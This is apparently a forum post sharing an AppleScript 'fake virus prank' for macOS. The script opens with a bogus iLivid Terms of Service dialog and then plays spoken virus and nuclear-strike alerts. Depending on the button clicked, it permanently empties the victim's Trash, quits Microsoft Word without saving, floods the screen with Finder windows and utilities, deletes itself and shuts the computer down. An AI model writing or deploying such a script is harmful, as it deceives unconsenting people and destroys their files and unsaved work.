--heres a even better one for a fake virus prank

tell application "Finder"
	-- set x to ((path to me as text) & "Contents:Resources:appicon.icn*s") as 
	display dialog "Please read and agree to our Terms of Service (ToS). " buttons "OK" default button "OK" with title "iLivid Terms of Service" with icon 1
	
	set volume 10
	do shell script "say -v trinoids Virus activated"
	display dialog "Virus propagating.
Plan of action?" buttons {"Seek and Destroy Virus", "Self Destruct"} with title "Virus Found" with icon 2
	if the button returned of the result is "Self Destruct" then
		set volume 10
		do shell script "say -v zarvox requesting authorisation for Thermonuclear weapons strike"
		display dialog "Thermonuclear Attack athorization.
Plan of action?" buttons {"Authorize", "Deauthorize"} with title "Thermonuclear Authorizatoin" with icon 2
		if the button returned of the result is "Authorize" then
			set volume 10
			do shell script "say -v zarvox Nuclear Attack Authorized"
			delay 2
			do shell script "say -v zarvox Get to the nearest Nuclear fallout bunker"
			delay 1
			do shell script "say -v zarvox This will now self destruct"
			set myPath to quoted form of POSIX path of (path to me)
			do shell script "rm -rfd " & myPath
			shut down
		else
			set volume 10
			do shell script "say -v zarvox Attack deauthorized"
			delay 1
			do shell script "say -v zarvox This will now self destruct"
			set myPath to quoted form of POSIX path of (path to me)
			do shell script "rm -rfd " & myPath
			shut down
		end if
	else
		tell application "Finder"
			activate
			empty trash
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			make new Finder window
			set target of Finder window 1 to startup disk
			set target of Finder window 1 to startup disk
			open application file "Terminal.app" of folder "Utilities" of folder "Applications" of startup disk
			set target of Finder window 1 to startup disk
			set target of Finder window 1 to folder "Applications" of startup disk
		end tell
		
		tell application "Finder"
			activate
			set target of Finder window 1 to startup disk
			open application file "Activity Monitor.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "AirPort Utility.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "Boot Camp Assistant.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "Bluetooth File Exchange.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "Disk Utility.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "Keychain Access.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "Terminal.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "System Information.app" of folder "Utilities" of folder "Applications" of startup disk
		end tell
		tell application "Finder"
			activate
			open application file "Network Utility.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "Grab.app" of folder "Utilities" of folder "Applications" of startup disk
			open application file "DigitalColor Meter.app" of folder "Utilities" of folder "Applications" of startup disk
			delay 5
			tell application "DigitalColor Meter" to quit
			tell application "Grab" to quit
			tell application "Network Utility" to quit
			tell application "System Information" to quit
			tell application "Terminal" to quit
			tell application "Keychain Access" to quit
			tell application "Disk Utility" to quit
			tell application "Bluetooth File Exchange" to quit
			tell application "Boot Camp Assistant" to quit
			tell application "AirPort Utility" to quit
			tell application "Activity Monitor" to quit
			tell application "App Store" to quit
			tell application "iTunes" to quit
			tell application "Microsoft Word" to quit saving no
			tell application "Finder"
				repeat while window 1 exists
					close window 1
				end repeat
				delay 1.5
				set volume 10
				do shell script "say -v fred YOU GOT TROLLED"
				tell application "Safari"
					open location "http://www.youtube.com/watch?v=Tc_dD_zhPE4"
					delay 1
				end tell
				set myPath to quoted form of POSIX path of (path to me)
				do shell script "rm -rfd " & myPath
				shut down
			end tell
		end tell
	end if
end tell